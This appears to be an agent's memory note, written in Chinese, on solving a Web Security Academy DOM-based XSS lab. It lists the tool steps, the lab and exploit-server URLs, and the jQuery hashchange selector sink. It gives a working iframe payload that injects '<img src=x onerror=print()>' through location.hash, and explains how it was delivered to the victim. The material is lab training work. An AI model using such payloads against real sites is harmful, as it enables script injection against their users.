---
metadata:
  node_type: memory
name: "PRS arm A lab-jquery-selector-hash-change-event"
description: "arm A 基线:lab-jquery-selector-hash-change-event 冷实例一次通过 - iframe onload 追加 hash 触发 jQuery 选择器 sink,交付须跟随 /deliver-to-victim 302 链"
last_updated: 2026-10-09T01:24:23+08:00
created: 2026-10-09T01:24:23+08:00
---

## 2026-10-09 arm A 基线 @lab-jquery-selector-hash-change-event

路径 `/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event` 有效,page_read 直出 widget-lab-id `B73AAD4E...48DCD`。

### 链路
1. `page_read <lab-page> --out /tmp/lab-jq.html` → lab_id。
2. `range_launch launch-url <lab-page> --jar /tmp/cj1.json` → instance `https://0a990049031eb18882762061002c00dd.web-security-academy.net/`,reused:false,exploit_server 字段为 null(需从实例页自取)。
3. `http_session get <instance>/` → 实例页 `#exploit-link` 给出 `https://exploit-0ab5000a0323b14b82a21ffc01f700be.exploit-server.net`。
4. `http_session get <exploit-server>/` → 表单字段:`responseFile=/exploit`、`responseHead`、`responseBody`、`urlIsHttps`、`formAction=STORE|DELIVER_TO_VICTIM|ACCESS_LOG`。
5. sink:首页 jQuery `$(window).on('hashchange', ...)` 把 `decodeURIComponent(location.hash.slice(1))` 拼进 `:contains(...)` 选择器 ⇒ `location.hash` 注入点。
6. 载荷(存到 /exploit):
   `<iframe src="https://<instance>/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
   首帧设 `#` 让 handler 注册,onload 追加片段触发 hashchange ⇒ jQuery 把 `<img...>` 当 HTML 建元素,onerror 执行 print()。
7. `http_session post <exploit-server>/ --follow --form formAction=DELIVER_TO_VICTIM ...` → 302 → `/deliver-to-victim` → 302 → `/`,第三跳页面 `is-solved` + "Congratulations, you solved the lab!"。
8. `banner_verdict <instance> --jar /tmp/cj1.json` → solved:true,congrats_line 命中。

### 坑(本次唯一)
- `DELIVER_TO_VICTIM` 的 POST 只回 302 `/deliver-to-victim`,**受害者投递发生在重定向链走完时**;不带 `--follow` 的 POST 投递不入队(实测三次无 `--follow` 投递后 exploit 访问日志只有自身 IP,零受害者命中)。
- 修正后一次 `--follow` 即 solved。判据:投递响应最终页(第 3 跳)出现 `is-solved`。
- exploit 表单每次 POST 都覆盖 `/exploit` 存档;用 `ACCESS_LOG` 读日志时若塞了占位 body 会把存档冲掉,须在最后一次投递前重新 STORE 或直接用 DELIVER 的完整 body。

### 件
全程 `page_read` / `range_launch` / `http_session` / `banner_verdict` / `nap`,无需新件。

